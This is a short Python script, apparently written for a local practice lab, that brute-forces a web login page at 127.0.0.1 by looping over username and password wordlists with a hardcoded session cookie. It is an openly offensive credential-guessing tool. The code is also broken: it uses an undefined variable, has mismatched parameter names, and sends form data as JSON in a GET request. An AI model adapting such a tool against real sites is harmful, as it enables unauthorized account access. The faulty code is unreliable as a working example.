import requests
import json

def brute_force_web(target_url, username, wordlist_pathword):
    with open(wordlist_username, 'r') as wordlist_username:
        for username in wordlist_username:
            username = username.strip()
            with open(wordlist_pathword, 'r') as wordlist_password:
                for password in wordlist_password:
                    password = password.strip()
                    payload = {
                        'username': username,
                        'password': password,
                        'Login': 'Login',
                    }
                
                    cookies = {"PHPSESSID": "PHPSESSID=plrurjmjolhprh0t4dkk9u09s5", "security": "low"}

                    # Faire une requête HTTP avec le nom d'utilisateur et le mot de passe
                    response = requests.get(target_url, json=payload, cookies=cookies)
                    print(response.text)
        return None


target_url = "http://127.0.0.1/login.php"
username = "admin"
wordlist_path = "wordlists/small.txt"

result = brute_force_web(target_url, username, wordlist_path)

